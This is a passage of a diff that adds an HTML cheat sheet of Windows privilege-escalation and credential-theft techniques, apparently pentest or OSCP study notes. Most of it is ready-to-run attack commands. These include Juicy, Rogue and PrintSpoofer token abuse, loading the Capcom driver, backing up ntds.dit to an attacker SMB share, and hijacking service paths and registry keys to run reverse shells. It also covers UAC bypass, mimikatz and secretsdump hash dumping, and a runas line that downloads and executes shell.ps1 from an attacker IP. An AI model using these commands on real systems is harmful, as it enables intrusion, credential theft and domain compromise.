+            <pre>&#13;&#10;Set oWS = WScript.CreateObject(&quot;WScript.Shell&quot;)&#13;&#10;sLinkFile = &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;&#13;&#10;Set oLink = oWS.CreateShortcut(sLinkFile)&#13;&#10;oLink.TargetPath = &quot;C:\PrivEsc\reverse.exe&quot;&#13;&#10;oLink.Save&#13;&#10;            </pre>
+        </ul>
+
+        <li>cmd "cscript CreateShortCut.vbs"</li>
+    </ul>
+
+    <hr>
+
+    <h2>Prilivege Abuse</h2>
+
+    <li>SeImpersonatePrivilege</li>
+    <li>Rotten Potato</li>
+    <ul>
+        <li>Works up until sometime in 2019. </li>
+        <li>Patched on latest Windows 10.</li>
+    </ul>
+
+    <li>Juicy Potato</li>
+    <ul>
+        <li>JuicyPotato.exe -l 1337 -p &lt;program&gt; -t * -c &lt;{CLSID}&gt;</li>
+    </ul>
+
+    <li>Rogue Potato</li>
+    <ul>
+        <li>More advanced and complicated than previous potato exploits.</li>
+        <li>Instructions</li>
+        <ul>
+            <li>Listener on Kali: sudo socat tcp-listen:135,reuseaddr,fork tcp:&lt;Victim ip address&gt;:9999</li>
+            <li>On victim Windows machine: RoguePotato.exe -r 10.0.0.5 -l 9999 -e "C:\windows\system32\cmd.exe"</li>
+        </ul>
+    </ul>
+
+    <li>PrintSpoofer</li>
+    <ul>
+        <li>Targets print spooler service</li>
+        <li>Does not require any port forwarding like potato exploits.</li>
+        <li>The entire exploit runs on the target machine. </li>
+        <li>Requires C++ redistributable is installed.</li>
+        <li>PrintSpoofer.exe -i -c "C:\reverse\shell.exe"</li>
+    </ul>
+
+    <li>SeAssignPrimaryTokenPrivilege</li>
+    <ul>
+        <li>Potato Exploits (SeImpersonatePrivilege)</li>
+    </ul>
+
+    <li>SeLoadDriverPrivilege</li>
+    <ul>
+        <li>Download these files:</li>
+        <ul>
+            <li>Capcom.sys from fuzzysecurity</li>
+            <li>https://github.com/TarlogicSecurity/EoPLoadDriver/</li>
+            <ul>
+                <li>eoploaddriver.cpp</li>
+            </ul>
+
+            <li>Exploitcapcom from github</li>
+        </ul>
+
+        <li>Compile EoPLoadDriver in visual studio</li>
+        <ul>
+            <li>Create a new project</li>
+            <ul>
+                <li>Console app</li>
+                <li>Name it LoadDriver</li>
+            </ul>
+
+            <li>Open LoadDriver.cpp</li>
+            <ul>
+                <li>Replace all contents with contents from eoploaddriver.cpp</li>
+            </ul>
+
+            <li>Select "Release" and "x64"</li>
+            <li>Build --&gt; Rebuild Solution. LoadDriver.exe should be created.</li>
+        </ul>
+
+        <li>Compile ExploitCapCom</li>
+        <ul>
+            <li>File --&gt; Open -- Project/Solution</li>
+            <ul>
+                <li>Select Exploit Capcom</li>
+                <li>Set "Release" and "x64"</li>
+                <li>Rebuild solution</li>
+                <li>ExploitCapCom.exe should be created</li>
+            </ul>
+        </ul>
+
+        <li>Transfer ExploitCapCom.exe, LoadDriver.exe, and capcom.sys to victim machine</li>
+        <ul>
+            <li>LoadDriver.exe System\CurrentControlSet\MyService C:\&lt;path to capcom.sys&gt;</li>
+            <li>.\ExploitCapCom.exe</li>
+            <li>Should have system shell.</li>
+        </ul>
+    </ul>
+
+    <li>SeBackupPrivilege</li>
+    <ul>
+        <li>Grants read access to all objects on the system regardless of ACL</li>
+        <ul>
+            <li>Read sensitive files</li>
+            <li>Extract hashes</li>
+            <ul>
+                <li>Pass-the-hash</li>
+                <li>Crack them</li>
+            </ul>
+        </ul>
+
+        <li>Backup ntds file to SMB server</li>
+        <table>
+            <tr>
+                <td>Create NTFS share on attacker</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Create 2gb NTFS folder called ntfs.disk</td>
+                            <td>dd if=/dev/zero of=ntfs.disk bs=1024M count=2</td>
+                        </tr>
+                        <tr>
+                            <td>Create loopback setup</td>
+                            <td>sudo losetup -fP ntfs.disk</td>
+                        </tr>
+                        <tr>
+                            <td>Check losetup</td>
+                            <td>losetup -a</td>
+                        </tr>
+                        <tr>
+                            <td>Create NTFS disk</td>
+                            <td>sudo mkfs.ntfs /dev/loop0</td>
+                        </tr>
+                        <tr>
+                            <td>Mount NTFS disk to a folder</td>
+                            <td>sudo mount /dev/loop0 ./smb</td>
+                        </tr>
+                        <tr>
+                            <td>Edit SMB to setup SMB share</td>
+                            <td>
+                                <li>sudo vi /etc/samba/smb.conf</li>
+                                <pre>&#13;&#10;[shared]&#13;&#10;comment = &lt;anything&gt;&#13;&#10;browseable = yes&#13;&#10;path = &lt;local path to SMB share&gt;&#13;&#10;read only = no&#13;&#10;guest = yes&#13;&#10;                                </pre>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>Start smb share</td>
+                            <td>sudo systemctl restart smbd</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+            <tr>
+                <td>Backup ntds file from victim</td>
+                <td>echo y | wbadmin start backup -backuptarget:\\&lt;ip address&gt;\share -include:C:\windows\ntds\
+                </td>
+            </tr>
+            <tr>
+                <td>extract contents of .vhdx on victim (using attacker SMB share)</td>
+                <td>
+                    <li>echo y | wbadmin start recovery -version:&lt;version&gt; -itemtype:file
+                        -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl</li>
+                    <li>Get version</li>
+                    <ul>
+                        <li>victim: "wbadmin get versions"</li>
+                        <ul>
+                            <li>Version identified:&lt;version&gt;</li>
+                        </ul>
+                    </ul>
+
+                    <li>ntds.dit should be in C:\</li>
+                </td>
+            </tr>
+        </table>
+    </ul>
+
+    <li>SeRestorePrivilege</li>
+    <ul>
+        <li>Grants write access to all objects on the system regardless of ACL</li>
+        <li>Modify service binaries</li>
+        <li>Overwrite DLLs used by SYSTEM processes</li>
+        <li>Modify registry settings</li>
+    </ul>
+
+    <li>SeTakeOwnershipPrivilege</li>
+    <ul>
+        <li>Lets the owner take ownership over an object</li>
+        <li>Same as SeRestorePrivilege after taking ownership of files</li>
+    </ul>
+
+    <li>More reading on token abuse: https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</li>
+
+    <hr>
+
+    <h2>Always Install Elevated</h2>
+
+    <li>Check if enabled</li>
+    <ul>
+
+        <li>HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</li>
+        </ul>
+
+        <li>HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</li>
+        <ul>
+            <li>reg query HKLM\software\policies\microsoft\windows\installer /v alwaysinstallelevated</li>
+        </ul>
+
+        <li>Create msi reverse shell and execute it</li>
+        <ul>
+            <li>msiexec /qn /i shell.msi</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Autorun Applications</h2>
+
+    <li>Enumerate Auto Run Programs</li>
+    <ul>
+        <li>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li>
+        <li>check for write to file permissions</li>
+        <ul>
+            <li>accesschk.exe /accepteula -quvw &lt;user&gt; &lt;service&gt;</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Insecure File Permissions</h2>
+
+    <li>Look for files of any type that can help break into the system. Scripts with hardcoded credentials, other
+        sensitive files, etc.</li>
+    <li>Search for world writable files:</li>
+    <ul>
+        <li>Accesschk.exe -uws "Everyone" "C:\Program Files"</li>
+        <li>Powershell.exe &quot;Get-ChildItem &quot;C:\Program Files&quot; -Recurse | Get-ACL | ?{$_.AccessToString
+            -match &quot;Everyone\sAllow\s\sModify&quot;}&quot;</li>
+    </ul>
+
+    <li>Configuration Files</li>
+    <ul>
+        <li>Look for files like Unattend.xml which might contain credentials</li>
+        <li>Search for files with pass in the name or ending in .config</li>
+        <ul>
+            <li>dir /s *pass* == *.config</li>
+        </ul>
+    </ul>
+
+    <li>Recursively search for files in the current directory that contain the word “password” and also end in either
+        .xml, .ini, or .txt:</li>
+    <ul>
+        <li>findstr /si password *.xml *.ini *.txt</li>
+    </ul>
+
+    <hr>
+
+    <h2>Insecure Services</h2>
+
+    <li>Manually enumerate insecure services</li>
+    <table>
+        <tr>
+            <td>View user service permissions</td>
+            <td>
+                <li>$acl = get-acl HKLM:\System\CurrentControlSet\Services</li>
+                <li>ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights | ForEach-Object {$_.DiscretionaryAcl}
+                </li>
+            </td>
+        </tr>
+        <tr>
+            <td>List services</td>
+            <td>gci HKLM:\SYSTEM\CurrentControlSet\Services</td>
+        </tr>
+        <tr>
+            <td>List started services</td>
+            <td>cmd.exe /c wmic service where started=true get name, startname</td>
+        </tr>
+        <tr>
+            <td>
+                <li>List services:</li>
+                <ul>
+                    <li>Running as: SYSTEM</li>
+                    <li>Start/stop type: manual</li>
+                </ul>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Create list of all services</td>
+                        <td>$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\*</td>
+                    </tr>
+                    <tr>
+                        <td>Show all services owened by SYSTEM and start type is manual</td>
+                        <td>$services | where { ($_.ObjectName -match &apos;LocalSystem&apos;) -and ($_.Start -match
+                            &apos;3&apos;) }</td>
+                    </tr>
+                    <tr>
+                        <td>Get list of services with only name, no details</td>
+                        <td>$names = $services.pschildname</td>
+                    </tr>
+                    <tr>
+                        <td>List all services owened by SYSTEM, start type manual, and we have permission to start</td>
+                        <td>$canStart = Foreach ($service in $names) { $sddl = (cmd /c sc sdshow $service); if ($sddl
+                            -match &quot;RP[A-Z]*?;;;AU&quot;) { $service }}</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>List permissions for a service</td>
+            <td>
+                <li>sc.exe sdshow &lt;service&gt;</li>
+                <li>ConvertFrom-SDDLString -Sddl &quot;&lt;output from sc.exe sdshow &lt;service&gt;&gt;&quot; |
+                    ForEach-Object {$_.DiscretionaryAcl}</li>
+                <li>How to read the permissions:
+                    https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/</li>
+            </td>
+        </tr>
+    </table>
+
+    <li>Tools</li>
+    <ul>
+        <li>winPEAS</li>
+        <table>
+            <tr>
+                <td>Check for service vulnerabilities</td>
+                <td>winPEASany.exe quiet servicesinfo</td>
+            </tr>
+        </table>
+
+        <li>sc.exe</li>
+        <table>
+            <tr>
+                <td>Start/Stop a service</td>
+                <td>sc.exe start/stop &lt;service name&gt;</td>
+            </tr>
+            <tr>
+                <td>Query the configuration of a service</td>
+                <td>sc.exe qc &lt;name&gt;</td>
+            </tr>
+            <tr>
+                <td>Query the current status of a service</td>
+                <td>sc.exe query &lt;name&gt;</td>
+            </tr>
+            <tr>
+                <td>Modify a configuration option of a service</td>
+                <td>sc.exe config &lt;name&gt; &lt;option&gt;= &lt;value&gt;</td>
+            </tr>
+            <tr>
+                <td>Change service start type</td>
+                <td>sc config &lt;Service Name&gt; start= auto</td>
+            </tr>
+            <tr>
+                <td>Change binary path</td>
+                <td>sc config &lt;name&gt; binpath= "\"C:\path\to\reverse_shell\""</td>
+            </tr>
+        </table>
+
+        <li>accesschk.exe</li>
+        <table>
+            <tr>
+                <td>Check for services we have rights/privileges to</td>
+                <td>accesschk.exe /accepteula -uwcqv "Authenticated Users" *</td>
+            </tr>
+            <tr>
+                <td>More details on user groups rights/privileges to a service</td>
+                <td>accesschk.exe /accepteula -ucqv &lt;Service Name&gt;</td>
+            </tr>
+            <tr>
+                <td>verify user permissions to a service</td>
+                <td>accesschk.exe /accepteula -ucqv &lt;username&gt; &lt;service&gt;</td>
+            </tr>
+            <tr>
+                <td>Check for permissions to write in a directory</td>
+                <td>accesschk.exe /accepteula -uwdq C:\directory</td>
+            </tr>
+            <tr>
+                <td>Check for access to insecure executables</td>
+                <td>accesschk.exe /accepteula -quvw &lt;Executable&gt;</td>
+            </tr>
+        </table>
+
+        <li>net</li>
+        <table>
+            <tr>
+                <td>Start/Stop a service</td>
+                <td>net start/stop &lt;name&gt;</td>
+            </tr>
+        </table>
+
+        <li>wmic</li>
+        <table>
+            <tr>
+                <td>Check service start options</td>
+                <td>wmic service where caption=&quot;&lt;ServiceName&gt;&quot; get name, caption, state, startmode</td>
+            </tr>
+            <tr>
+                <td>Check running services</td>
+                <td>wmic service get name,displayname,pathname,startmode</td>
+            </tr>
+            <tr>
+                <td>Get running services that are auto and not standard windows</td>
+                <td>wmic service get name,displayname,pathname,startmode |findstr /i "auto"|findstr /i /v "c:\windows"
+                </td>
+            </tr>
+        </table>
+
+        <li>powershell</li>
+        <table>
+            <tr>
+                <td>List running services</td>
+                <td>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like
+                    &apos;Running&apos;}</td>
+            </tr>
+            <tr>
+                <td>Start service</td>
+                <td>Start-Service &lt;service&gt;</td>
+            </tr>
+        </table>
+
+        <li>cmd</li>
+        <table>
+            <tr>
+                <td>List running services</td>
+                <td>tasklist</td>
+            </tr>
+        </table>
+
+        <li>icacls</li>
+        <table>
+            <tr>
+                <td>Check directory permissions</td>
+                <td>icacls "C:\&lt;Directory&gt;"</td>
+            </tr>
+            <tr>
+                <td>Check for access to insecure executable</td>
+                <td>Icacls &quot;&lt;Executable&gt;&quot;</td>
+            </tr>
+        </table>
+    </ul>
+
+    <li>Insecure Service Properties</li>
+    <ul>
+        <li>Change binary path</li>
+        <ul>
+            <li>sc config &lt;name&gt; binpath= &quot;\&quot;C:\reverse_shell.exe""</li>
+            <li>sc.exe config usosvc binpath="cmd.exe /c powershell.exe -EncodedCommand &lt;base64&gt;</li>
+        </ul>
+    </ul>
+
+    <li>Unquoted Service Path</li>
+    <ul>
+        <li>Try to raplce a path location to a reverse shell executable</li>
+        <ul>
+            <li>Example</li>
+            <ul>
+                <li>C:\Program Files\Unquoted Path Service\Common Files\originalservice.exe</li>
+                <ul>
+                    <li>windows would try to execute "Program" first, then "Unquoted", then "Common", and finally
+                        "originalservice.exe"</li>
+                    <ul>
+                        <li>If we can create a reverse shell named "Program.exe", "Unquoted.exe", etc, we can get
+                            reverse shell</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Weak Registry Permissions</li>
+    <ul>
+        <li>INTERACTIVE group includes all users that can login locally</li>
+    </ul>
+
+    <table>
+        <tr>
+            <td>Check registry permissions using PowerShell</td>
+            <td>Get-Acl HKLM:\registry\directory | format-list</td>
+        </tr>
+        <tr>
+            <td>Check permissions using accesschk.exe</td>
+            <td>accesschk.exe /accepteula -uvwqk HKLM\registry\directory</td>
+        </tr>
+        <tr>
+            <td>Check current values in registry entry</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>reg query HKLM\System\CurrentControlSet\services\&lt;service&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Get-Item HKLM:\System\CurrentControlSet\Services\&lt;service&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Change registry value</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>reg add HKLM\service\path /v ImagePath /t REG_EXPAND_SZ /d D:\PrivEsc\shell4444.exe /f</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>Set-ItemProperty -path HKLM:\System\CurrentControlSet\Services\&lt;service&gt; -Name
+                            ImagePath -Value &quot;&lt;executable&gt;&quot;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <li>Insecure Service Executables</li>
+    <ul>
+        <li>If able, replace original service executable with our own.</li>
+    </ul>
+
+    <table>
+        <tr>
+            <td>Check for access with accesschk.exe</td>
+            <td>accesschk.exe /accepteula -quvw "C:\&lt;executable&gt;"</td>
+        </tr>
+        <tr>
+            <td>Check access with icacls</td>
+            <td>Icacls "C:\&lt;executable&gt;"</td>
+        </tr>
+    </table>
+
+    <li>DLL Hijacking</li>
+    <ul>
+        <li>Enumerate non-windows services to see which one we are able to start/stop</li>
+        <li>Analyze the service executable using procmon and implement a malicious .dll file:</li>
+        <ul>
+            <li>Download executable</li>
+            <li>Open procmon</li>
+            <li>Stop and clear capture</li>
+            <li>Push ctrl + L - drop down menu for &quot;Process Name&quot; - enter process name - push add &amp; OK
+            </li>
+            <li>Deselect &quot;show registry activity&quot; &amp; &quot;show network activity&quot;</li>
+            <li>Start capture</li>
+            <li>Look for dll's that are attempted to be executed but do not exist. Put a reverse shell .dll in that
+                directory</li>
+        </ul>
+        <li>Start the vulnerable service</li>
+    </ul>
+
+    <hr>
+
+    <h2>Scheduled Tasks</h2>
+
+    <li>Tasks run at time intervals or by events (log-on, etc)</li>
+    <li>Tasks run with privileges of user who created them.</li>
+    <ul>
+        <li>Administrator can set tasks to run as other users.</li>
+    </ul>
+
+    <li>List all scheduled tasks your user can see:</li>
+    <ul>
+        <li>Schtasks /query /fo LIST /v</li>
+        <li>Get-ScheduledTask| where {$_.TaskPath-notlike&quot;\Microsoft*&quot;} | ft TaskName,TaskPath,State</li>
+    </ul>
+
+    <li>Usually need to look for tasks based on other clues like finding a script or log file that shows a scheduled
+        task is being run.</li>
+    <li>look for a script running on a schedule and modify it with some malicious action. Look into interesting
+        directories.</li>
+
+    <hr>
+
+    <h2>Bypass UAC</h2>
+
+    <li>UAC Bypass requires administrator account</li>
+    <li>Check if UAC is on</li>
+    <ul>
+        <li>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System</li>
+        <ul>
+            <li>EnableLUA</li>
+            <ul>
+                <li>0 = UAC enabled, no bypass needed, can PsExec to SYSTEM</li>
+                <li>1 = UAC disabled, need to check the other 2 keys</li>
+            </ul>
+
+            <li>ConsentPromptBehaviorAdmin</li>
+            <ul>
+                <li>Can take on 6 different values</li>
+            </ul>
+
+            <li>PromptOnSecureDesktop</li>
+            <ul>
+                <li>Either 1 or 0</li>
+            </ul>
+
+            <li>If ConsentPromptBehaviorAdmin=2 &amp; PromptOnSecureDesktop=1 then UAC bypass will not work</li>
+            <li>If ConsentPromptBehaviorAdmin=5 &amp; PromptOnSecureDesktop=1 then UAC bypass will work</li>
+        </ul>
+    </ul>
+
+    <li>ConsentPromptBehaviorAdmin Values:</li>
+    <table>
+        <tr>
+            <td>Value</td>
+            <td>Meaning</td>
+        </tr>
+        <tr>
+            <td>0x00000000</td>
+            <td>This option allows the Consent Admin to perform an operation that requires elevation without consent or
+                credentials.</td>
+        </tr>
+        <tr>
+            <td>0x00000001</td>
+            <td>This option prompts the Consent Admin to enter his or her user name and password (or another valid
+                admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.
+            </td>
+        </tr>
+        <tr>
+            <td>0x00000002</td>
+            <td>This option prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or
+                &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit,
+                the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes
+                the inconvenience of requiring that users enter their name and password to perform a privileged task.
+                This operation occurs on the secure desktop.</td>
+        </tr>
+        <tr>
+            <td>0x00000003</td>
+            <td>This option prompts the Consent Admin to enter his or her user name and password (or that of another
+                valid admin) when an operation requires elevation of privilege.</td>
+        </tr>
+        <tr>
+            <td>0x00000004</td>
+            <td>This prompts the administrator in Admin Approval Mode to select either &quot;Permit&quot; or
+                &quot;Deny&quot; an operation that requires elevation of privilege. If the Consent Admin selects Permit,
+                the operation will continue with the highest available privilege. &quot;Prompt for consent&quot; removes
+                the inconvenience of requiring that users enter their name and password to perform a privileged task.
+            </td>
+        </tr>
+        <tr>
+            <td>0x00000005</td>
+            <td>This option is the default. It is used to prompt the administrator in Admin Approval Mode to select
+                either &quot;Permit&quot; or &quot;Deny&quot; for an operation that requires elevation of privilege for
+                any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the
+                highest available privilege. This operation will happen on the secure desktop.</td>
+        </tr>
+    </table>
+
+    <li>Eventvwr.exe UAC bypass:</li>
+    <ul>
+        <li>Works on Windows 7, 8, and 10. Does not work on Vista</li>
+        <li>Guide: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/</li>
+        <li>Exploit in C (requires minimal editing) - https://github.com/turbo/zero2hero</li>
+    </ul>
+
+    <li>Pre-made UAC bypass executables on Kali</li>
+    <ul>
+        <li>bypassuac-x86.exe & bypassuac-x64.exe</li>
+        <li>Same limitations as eventvwr.exe UAC bypass</li>
+        <li>bypassuac-x**.exe /c C:\directory\to\shell4444.exe</li>
+    </ul>
+
+    <hr>
+
+    <h2>Finding Logged in Users</h2>
+
+    <li>Enumerate Logged on Users</li>
+    <ul>
+        <li>Individual Workstation</li>
+        <ul>
+            <li>NetWkstaUserEnum</li>
+            <ul>
+                <li>Requires admin privileges</li>
+            </ul>
+
+            <li>Powerview.ps1</li>
+            <ul>
+                <li>Get-NetLoggedon –ComputerName &lt;workstation name&gt;</li>
+            </ul>
+        </ul>
+
+        <li>Domain Enumeration</li>
+        <ul>
+            <li>NetSessionEnum</li>
+            <ul>
+                <li>Enumerate active sessions on domain joined machines</li>
+                <li>Does not require admin privileges</li>
+                <li>Use against file servers and domain controllers</li>
+                <li>Powerview.ps1</li>
+                <ul>
+                    <li>Get-NetSession</li>
+                    <ul>
+                        <li>Get-NetSession –ComputerName &lt;domain controller or server &ndash; ex. dc01&gt;</li>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Cached Credentials</h2>
+
+    <table>
+        <tr>
+            <td>Check for cached credentials</td>
+            <td>cmdkey /list</td>
+        </tr>
+        <tr>
+            <td>Run command under context of a cached credential</td>
+            <td>runas /user:&lt;user&gt; /savecred "&lt;command&gt;"</td>
+        </tr>
+        <tr>
+            <td>Example</td>
+            <td>
+                <pre>cmdkey /list&#13;&#10;&#13;&#10;Currently stored credentials:&#13;&#10;                        &#13;&#10;Target: Domain:interactive=ACCESS\Administrator&#13;&#10;Type: Domain Password&#13;&#10;User: ACCESS\Administrator&#13;&#10;                            &#13;&#10;runas /user:ACCESS\Administrator /savecred &quot;powershell iex(new-object net.webclient).downloadstring(&apos;http://10.10.14.77/shell.ps1&apos;)&quot;</pre>
+            </td>
+        </tr>
+    </table>
+
+    <li>If credentials are cached then we can find the cleartext password using mimikatz</li>
+
+    <table>
+        <tr>
+            <td>Master key</td>
+            <td>
+                <li>Location - C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;GUID&gt;</li>
+                <ul>
+                    <li>&lt;SID&gt; - Users security identifier</li>
+                    <li>&lt;GUID&gt; - Name of master key</li>
+                </ul>
+                <li>A user can have multiple master keys</li>
+                <li>Master key can be decrypted using user's password or domain backup key</li>
+                <li>A decrypted master key can be used to decrypt any DPAPI data blobs</li>
+                <table>
+                    <tr>
+                        <td>Decrpyt using mimikatz</td>
+                        <td>dpapi::masterkey /in:&lt;master key file&gt; /sid:&lt;SID&gt; /password:&lt;password&gt;
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Encrypted Credential Manager Credentials</td>
+            <td>
+                <li>User credential Locations</li>
+                <ul>
+                    <li>C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials\</li>
+                </ul>
+
+                <li>System credential location -
+                    %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\</li>
+                <table>
+                    <tr>
+                        <td>mimikatz decrypt file using master key</td>
+                        <td>
+                            <li># dpapi::cred /in:&lt;credential file&gt;</li>
+                            <ul>
+                                <li>If ran after decrypting a master key the mimikatz will automatically apply it</li>
+                            </ul>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+    </table>
+
+    <li>Resources:</li>
+    <ul>
+        <li>https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/</li>
+        <li>HTB: Access</li>
+    </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Security Identifier (SID)</h2>
+
+    <li>Every account has one.</li>
+    <ul>
+        <li>There is a separate one for each account that is used for elevated privileges (UAC)</li>
+    </ul>
+
+    <li>Windows refers to accounts by SIDs, people refer to accounts by account names</li>
+    <li>All SIDs start with S-1-5-21</li>
+    <ul>
+        <li>Admin always ends in 500</li>
+        <li>Guest always ends in 501</li>
+        <li>S-1-5-19 is the LocalSystem account</li>
+    </ul>
+
+    <li>Example SID: S-1-5-21-1180699209-877415012-3182924384-1004</li>
+    <table>
+        <tr>
+            <td>S</td>
+            <td>1</td>
+            <td>5</td>
+            <td>21-1180699209-877415012-3182924384</td>
+            <td>1004</td>
+        </tr>
+        <tr>
+            <td>Indicates this is a SID</td>
+            <td>SID specification version number</td>
+            <td>Identifier authority</td>
+            <td>Domain or local computer identifier</td>
+            <td>Relative ID</td>
+        </tr>
+    </table>
+
+    <hr>
+
+    <h2>Dump Proccess</h2>
+
+    <li>.\procdump64.exe -ma &lt;PID&gt; -accepteula</li>
+    <li>Mimikittenz</li>
+    <ul>
+        <li>Check memory of user processes for passwords. By defalt checks IE, Chrome, and Firefox for POST requests to
+            well known websites.</li>
+    </ul>
+
+    <li>https://live.sysinternals.com/</li>
+
+    <hr>
+
+    <h2>Dump Hashes</h2>
+
+    <li>Dumped hash format</li>
+    <ul>
+        <li>Username:#:LM HASH:NTLM HASH:::</li>
+    </ul>
+
+    <li>SAM, SYSTEM, and SECURITY Location</li>
+    <ul>
+        <li>C:\Windows\System32\config\</li>
+        <li>Backup Locations</li>
+        <ul>
+            <li>C:\Windows\System32\config\RegBack</li>
+            <li>C:\Windows\Repair</li>
+        </ul>
+        <li>reg save HKLM\&lt;file&gt; &lt;Out file&gt;</li>
+        <ul>
+            <li>reg save HKLM\SAM C:\SAM</li>
+            <li>reg save HKLM\SECURITY C:\SECURITY</li>
+            <li>reg save HKLM\SYSTEM C:\SYSTEM</li>
+        </ul>
+    </ul>
+
+    <li>vssadmin</li>
+    <ul>
+        <li>Dump ntds.dit</li>
+        <ul>
+            <li>vssadmin create shadow /for=C:</li>
+            <li>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy</li>
+            <li>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy</li>
+        </ul>
+    </ul>
+
+    <li>mimikatz</li>
+    <ul>
+        <li>Extracts hashes from the Local Security Authority Subsystem (LSASS)</li>
+        <li>Dump creds/hashes</li>
+        <ul>
+            <li>Summary</li>
+            <ul>
+                <li>privilege::debug</li>
+                <li>token::elevate</li>
+                <li>lsadump::sam</li>
+                <li>sekurlsa::logonpasswords</li>
+            </ul>
+
+            <li>Explained/Detailed</li>
+            <ul>
+                <li>Mimikatz must be launched from an administrative command prompts</li>
+                <ul>
+                    <li>Must first execute two commands:</li>
+                    <ul>
+                        <li>privilege::debug – enables SeDebugPrivilege</li>
+                        <ul>
+                            <li>If fails, mimikatz was most likely not executed with admin privileges</li>
+                        </ul>
+
+                        <li>token::elevate</li>
+                        <ul>
+                            <li>Elevates mimikatz security token from administrator to SYSTEM</li>
+                            <li>If mimikatz is launched from a SYSTEM shell, this step can be skipped</li>
+                        </ul>
+                    </ul>
+
+                    <li>Dump SAM contents (Security Account Manager)</li>
+                    <ul>
+                        <li>lsadump::sam</li>
+                    </ul>
+
+                    <li>Dump NTLM hash</li>
+                    <ul>
+                        <li>sekurlsa::logonpasswords</li>
+                        <ul>
+                            <li>This will dump the credentials of all users currently logged into the workstation or
+                                server.</li>
+                            <ul>
+                                <li>Includes remote logins like RDP sessions</li>
+                            </ul>
+
+                            <li>If WDigest is enabled Mimikatz will reveal cleartext passwords alongside hashes (Windows
+                                7)</li>
+                        </ul>
+                    </ul>
+                </ul>
+            </ul>
+        </ul>
+
+        <li>ERROR kuhl_m_sekurlsa_acquireLSA; Key import</li>
+        <ul>
+            <li>Newer Windows update makes it so mimikatz versions 2.2.0 and newer do not work. Must use an older
+                version of mimikatz.</li>
+            <ul>
+                <li>https://gitlab.com/kalilinux/packages/mimikatz/-/tree/d72fc2cca1df23f60f81bc141095f65a131fd099/</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Other tools such as samdump2, pwdump, fgdump, and Windows Credential Editor (wce) work well against older
+        Windows OS's such as XP or Server 2003</li>
+
+    <li>impacket-secretsdump</li>
+    <ul>
+        <li>Dump hashes locally</li>
+        <ul>
+            <li>impacket-secretsdump -sam &lt;SAM file&gt; -security &lt;SECURITY file&gt; [-system &lt;SYSTEM file&gt;]
+                LOCAL</li>
+        </ul>
+    </ul>
+
+    <hr>
+
+    <h2>Active Directory</h2>
+
+    <li>Authentication</li>
+    <ul>
+        <li>NTLM</li>
+        <ul>
+            <li>Used when clients authenticate to a server by IP (instead of hostname) or if a user attempts to
+                authenticate to a hostname that is not registered on the AD DNS server. 3rd party applications can also
+                choose NTLM instead of Kerberos.</li>
+            <li>NTLM hashes can be cracked very quickly</li>
+        </ul>
+        <li>Kerberos</li>
+    </ul>
+
+    <li>ntds.dit file</li>
+    <ul>
+        <li>Database stored on DC that contains all active directory information including password hashes for all users
+            in the domain</li>
+        <li>C:\windows\ntds\</li>
+        <li>Can use SYSTEM file to decrypt the ntds.dit and extract all the information from it</li>
+        <ul>
+            <li>impacket-secretsdump -ntds &lt;ntds.dit file&gt; -system &lt;SYSTEM file&gt; [-security &lt;SECURITY
+                file&gt;] LOCAL</li>
+            <ul>
+                <li>Additional Useful flags:</li>
+                <ul>
+                    <table>
+                        <tr>
+                            <td>-pwd-last-set</td>
+                            <td>If user has multiple accounts and changes password in same timeframe then likey all
+                                passwords are the same </td>
+                        </tr>
+                        <tr>
+                            <td>-user-status</td>
